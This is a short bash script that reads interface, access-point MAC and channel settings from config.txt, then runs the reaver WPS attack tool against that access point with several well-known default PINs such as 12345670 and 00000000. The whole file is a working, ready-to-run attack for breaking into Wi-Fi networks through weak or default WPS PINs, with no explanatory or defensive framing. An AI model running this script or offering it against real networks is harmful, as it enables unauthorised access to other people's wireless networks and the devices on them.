#!/bin/bash

source config.txt

for pin in '' 12345670 00000000 11111111 01230123 31415926 12345678; do reaver -i $interface -b $ap_mac -c $channel -f -N -g 1 -vv -p "$pin"
done
